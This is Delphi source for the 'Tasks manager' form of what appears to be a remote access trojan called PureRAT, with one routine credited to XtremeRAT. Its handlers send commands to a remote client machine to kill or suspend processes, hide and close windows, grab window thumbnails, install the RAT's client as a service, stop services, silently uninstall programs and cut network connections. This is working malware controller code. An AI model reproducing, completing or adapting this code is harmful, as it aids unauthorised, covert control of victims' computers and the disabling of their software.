  var DefaultDraw: Boolean);
begin
  if Item.Data <> nil then Sender.Canvas.Font.Color := TColor(Item.Data);
end;
       
procedure TFormTasksManager.lvProcessContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(lvProcess.Selected) then
  begin
    for i := 0 to pm1.Items.Count - 1 do pm1.Items[i].Enabled := False;
    pm1.Items[0].Enabled := True;
  end
  else
  begin
    for i := 0 to pm1.Items.Count - 1 do pm1.Items[i].Enabled := True;
    if lvProcess.Selected.Cut = True then
    begin
      pm1.Items[2].Enabled := False;
      pm1.Items[3].Enabled := True;
    end
    else
    begin
      pm1.Items[2].Enabled := True;
      pm1.Items[3].Enabled := False
    end;
  end;
end;

procedure TFormTasksManager.R2Click(Sender: TObject);
begin
  SendDatas(Client.AThread, PROCESSLIST + '|');
  UpdateStatus('Requesting remote process list, please wait...');
end;

procedure TFormTasksManager.S1Click(Sender: TObject);
begin
  SendDatas(Client.AThread, PROCESSSUSPEND + '|' + lvProcess.Selected.Caption);
end;

procedure TFormTasksManager.R3Click(Sender: TObject);
begin
  SendDatas(Client.AThread, PROCESSRESUME + '|' + lvProcess.Selected.Caption);
end;

procedure TFormTasksManager.K1Click(Sender: TObject);
begin
  SendDatas(Client.AThread, PROCESSKILL + '|' + lvProcess.Selected.Caption);
end;

procedure TFormTasksManager.C5Click(Sender: TObject);
begin
  SetClipboardText(lvProcess.Selected.SubItems[4]);
end;
       
procedure TFormTasksManager.lvProcessKeyPress(Sender: TObject;
  var Key: Char);
begin
  if not Assigned(lvProcess.Selected) then Exit;
  if Key = Char(VK_DELETE) then K1.Click;;
end;

procedure TFormTasksManager.lvWindowsContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(lvWindows.Selected) then
  begin
    for i := 0 to pm2.Items.Count - 1 do pm2.Items[i].Enabled := False;
    pm2.Items[0].Enabled := True;
    pm2.Items[1].Enabled := True;
    if lvWindows.Items.Count > 0 then pm2.Items[8].Enabled := True else
      pm2.Items[8].Enabled := False;
  end
  else
  begin
    for i := 0 to pm2.Items.Count - 1 do pm2.Items[i].Enabled := True;
    if lvWindows.Selected.Cut = True then
    begin
      pm2.Items[4].Enabled := False;
      pm2.Items[3].Enabled := True;
    end
    else
    begin
      pm2.Items[4].Enabled := True;
      pm2.Items[3].Enabled := False
    end;
  end;
end;

procedure TFormTasksManager.R4Click(Sender: TObject);
begin
  if O1.Checked then SendDatas(Client.AThread, WINDOWSLIST + '|Y') else
    SendDatas(Client.AThread, WINDOWSLIST + '|N');
  UpdateStatus('Requesting remote windows list, please wait...');
end;

procedure TFormTasksManager.O1Click(Sender: TObject);
begin
  O1.Checked := not O1.Checked;
end;

procedure TFormTasksManager.S2Click(Sender: TObject);
begin
  SendDatas(Client.AThread, WINDOWSSHOW + '|' + lvWindows.Selected.SubItems[2]);
end;

procedure TFormTasksManager.H1Click(Sender: TObject);
begin
  SendDatas(Client.AThread, WINDOWSHIDE + '|' + lvWindows.Selected.SubItems[2]);
end;

procedure TFormTasksManager.C1Click(Sender: TObject);
var
  TmpStr: string;
begin
  TmpStr := InputBox('Change window title', 'New title', '');
  SendDatas(Client.AThread, WINDOWSTITLE + '|' +
            lvWindows.Selected.SubItems[2] + '|' + TmpStr);
end;

procedure TFormTasksManager.D1Click(Sender: TObject);
begin
  D1.Checked := not D1.Checked;
  if D1.Checked then
  SendDatas(Client.AThread, WINDOWSDISABLECLOSEBUTTON + '|' + lvWindows.Selected.SubItems[2]);
end;
       
procedure TFormTasksManager.S6Click(Sender: TObject);
var
  Tmpstr: string;
  Shaketime: Integer;
begin
  if not InputQuery(PROGRAMNAME + ' ' + PROGRAMVERSION, 'Shaking time (1-5s)', Tmpstr) then Exit;
  if TryStrToInt(Tmpstr, Shaketime) = False then Exit;
  if (Shaketime >= 1) and (Shaketime <= 5) then
  SendDatas(Client.AThread, WINDOWSSHAKE + '|' + IntToStr(Shaketime * 1000));
end;

procedure TFormTasksManager.W1Click(Sender: TObject);
var
  i: Integer;
  TmpStr: string;
begin     
  if Client.Items.SubItems[10] = 'No' then
  begin
    MessageBox(Handle, 'Plugin is missing on remote machine. Please upload plugin first.',
               PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
               MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
    Exit;
  end;

  for i := 0 to lvWindows.Items.Count -1 do
  begin
    if lvWindows.Items.Item[i].Cut = False then
    TmpStr := TmpStr + lvWindows.Items.Item[i].SubItems[2] + '|';
  end;

  if TmpStr = '' then Exit;
  SendDatas(Client.AThread, WINDOWSTHUMBNAILS + '|' + TmpStr);
  UpdateStatus('Requesting remote windows thumbnails, please wait...');
end;

procedure TFormTasksManager.C2Click(Sender: TObject);
begin
  SendDatas(Client.AThread, WINDOWSCLOSE + '|' + lvWindows.Selected.SubItems[2]);
end;

procedure TFormTasksManager.C6Click(Sender: TObject);
begin
  SetClipboardText(lvWindows.Selected.SubItems[4]);
end;

procedure TFormTasksManager.lvServicesContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(lvServices.Selected) then
  begin
    for i := 0 to pm3.Items.Count - 1 do pm3.Items[i].Enabled := False;
    pm3.Items[0].Enabled := True;
    pm3.Items[4].Enabled := True;
  end
  else
  begin
    for i := 0 to pm3.Items.Count - 1 do pm3.Items[i].Enabled := True;
    if lvServices.Selected.Cut = True then
    begin
      pm3.Items[2].Items[0].Enabled := True;
      pm3.Items[2].Items[1].Enabled := False;
    end
    else
    begin
      pm3.Items[2].Items[0].Enabled := False;
      pm3.Items[2].Items[1].Enabled := True;
    end;
  end;
end;

procedure TFormTasksManager.R5Click(Sender: TObject);
begin
  SendDatas(Client.AThread, SERVICESLIST + '|');
  UpdateStatus('Requesting remote running services list, please wait...');
end;

procedure TFormTasksManager.S3Click(Sender: TObject);
begin
  SendDatas(Client.AThread, SERVICESSTART + '|' + lvServices.Selected.Caption);
end;

procedure TFormTasksManager.S4Click(Sender: TObject);
begin
  SendDatas(Client.AThread, SERVICESSTOP + '|' + lvServices.Selected.Caption);
end;

function ServiceStartupCode(Startup: string): Integer;
begin
  if Startup = 'Automatic' then Result := 2 else
  if Startup = 'Manual' then Result := 3 else
  if Startup = 'Disable' then Result := 4 else Result := -1;
end;

procedure TFormTasksManager.E1Click(Sender: TObject);
var
  TmpForm: TFormServicesManager;
begin
  TmpForm := TFormServicesManager.Create(Application);
  TmpForm.edtName.Text := lvServices.Selected.Caption;
  TmpForm.edtFilename.Text := lvServices.Selected.SubItems[3];
  TmpForm.edtDescription.Text := lvServices.Selected.SubItems[2];
  TmpForm.cbbStartup.ItemIndex := ServiceStartupCode(lvServices.Selected.SubItems[1]) - 2;

  if TmpForm.ShowModal = mrOK then
  begin
    SendDatas(Client.AThread, SERVICESEDIT + '|' +
              TmpForm.edtName.Text + '|' + TmpForm.edtFilename.Text + '|' +
              TmpForm.edtDescription.Text + '|' + TmpForm.cbbStartup.Items.Text);
  end;

  TmpForm.Release;
  TmpForm := nil;
end;

procedure TFormTasksManager.I1Click(Sender: TObject);
var
  TmpForm: TFormServicesManager;
begin
  TmpForm := TFormServicesManager.Create(Application);
  TmpForm.edtName.Text := 'PureRATClient';
  TmpForm.edtFilename.Text := TmpDir + 'PureRATClient.exe';
  TmpForm.edtDescription.Text := 'PureRAT client service';
  TmpForm.cbbStartup.ItemIndex := 0;

  if TmpForm.ShowModal = mrOK then
  begin
    SendDatas(Client.AThread, SERVICESINSTALL + '|' +
              TmpForm.edtName.Text + '|' + TmpForm.edtFilename.Text + '|' +
              TmpForm.edtDescription.Text + '|' + TmpForm.cbbStartup.Items.Text);
  end;

  TmpForm.Release;
  TmpForm := nil;
end;

procedure TFormTasksManager.U2Click(Sender: TObject);
begin
  if MessageBox(Handle, PChar('Are you sure you want to uninstall service "' +
                lvServices.Selected.Caption + '"?'),
                PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
                MB_YESNOCANCEL or MB_ICONWARNING or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) <> IDYES then Exit;
                                       
  SendDatas(Client.AThread, SERVICESUNINSTALL + '|' + lvServices.Selected.Caption);
end;

procedure TFormTasksManager.lvProgramsContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(lvPrograms.Selected) then
  begin
    for i := 0 to pm4.Items.Count - 1 do pm4.Items[i].Enabled := False;
    pm4.Items[0].Enabled := True;
  end
  else
  begin
    for i := 0 to pm4.Items.Count - 1 do pm4.Items[i].Enabled := True;
    if lvPrograms.Items.Item[i].SubItems[4] <> ''  then
      pm4.Items[3].Enabled := True
    else pm4.Items[3].Enabled := False;
  end;
end;

procedure TFormTasksManager.R6Click(Sender: TObject);
begin
  SendDatas(Client.AThread, PROGRAMSLIST + '|');
  UpdateStatus('Requesting remote installed programs list, please wait...');
end;

procedure TFormTasksManager.U1Click(Sender: TObject);
begin
  SendDatas(Client.AThread, PROGRAMSUNINSTALL + '|' + lvPrograms.Selected.SubItems[3]);
end;

//From XtremeRAT
procedure ParseInstaller(Data: string; var path: string; var param: string);
var
  exe: string;
  p: integer;
begin
  if copy(data,1,1) <> '"' then
  begin
    path := data;
    param := '';
    exit;
  end;

  Delete(Data,1,1);
  p := pos('"',Data);
  path := copy(Data,1,p-1);
  Delete(data,1,p+1);
  param := data;
end;

procedure TFormTasksManager.S5Click(Sender: TObject);
var
  Path, Params: string;
begin
  ParseInstaller(lvPrograms.Selected.SubItems[4], Path, Params);
  SendDatas(Client.AThread, PROGRAMSSILENTUNINSTALL + '|' + Path + '|' + Params);
end;

procedure TFormTasksManager.lvConnectionsContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(lvConnections.Selected) then
  begin
    for i := 0 to pm5.Items.Count - 1 do pm5.Items[i].Enabled := False;
    pm5.Items[0].Enabled := True;
    pm5.Items[1].Enabled := True;
  end
  else for i := 0 to pm5.Items.Count - 1 do pm5.Items[i].Enabled := True;
end;

procedure TFormTasksManager.R14Click(Sender: TObject);
begin
  if R15.Checked then SendDatas(Client.AThread, ACTIVECONNECTIONSLIST + '|Y') else
    SendDatas(Client.AThread, ACTIVECONNECTIONSLIST + '|N');
  UpdateStatus('Requesting remote active connections list, please wait...');
end;

procedure TFormTasksManager.R15Click(Sender: TObject);
begin
  R15.Checked := R15.Checked;
end;

procedure TFormTasksManager.C4Click(Sender: TObject);
begin
  SendDatas(Client.AThread, ACTIVECONNECTIONSCLOSE + '|' +
            lvConnections.Selected.SubItems[2] + '|' +
            lvConnections.Selected.SubItems[3]);
end;

procedure TFormTasksManager.K2Click(Sender: TObject);
begin
  SendDatas(Client.AThread, ACTIVECONNECTIONSKILLPROCESS + '|' +
            lvConnections.Selected.Caption);
end;

procedure TFormTasksManager.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  TmpStr: string;
  IniFile: TIniFile;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  IniFile.WriteInteger('Tasks manager', 'Left', Left);
  IniFile.WriteInteger('Tasks manager', 'Top', Top);
  IniFile.WriteInteger('Tasks manager', 'Width', Width);
  IniFile.WriteInteger('Tasks manager', 'Height', Height);
  IniFile.WriteBool('Tasks manager', 'Only visible windows', O1.Checked);
  IniFile.WriteBool('Tasks manager', 'Resolve DNS', R15.Checked);
  IniFile.Free;
end;

procedure TFormTasksManager.FormCreate(Sender: TObject);
var
  TmpStr: string;
  IniFile: TIniFile;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  Left := IniFile.ReadInteger('Tasks manager', 'Left', 261);
  Top := IniFile.ReadInteger('Tasks manager', 'Top', 126);
  Width := IniFile.ReadInteger('Tasks manager', 'Width', 662);
  Height := IniFile.ReadInteger('Tasks manager', 'Height', 360);
  O1.Checked := IniFile.ReadBool('Tasks manager', 'Only visible windows', True);
  R15.Checked := IniFile.ReadBool('Tasks manager', 'Resolve DNS', False);
  IniFile.Free;

  lvProcess.SmallImages := FormMain.ImagesList;
  lvWindows.SmallImages := FormMain.ImagesList;
end;

end.
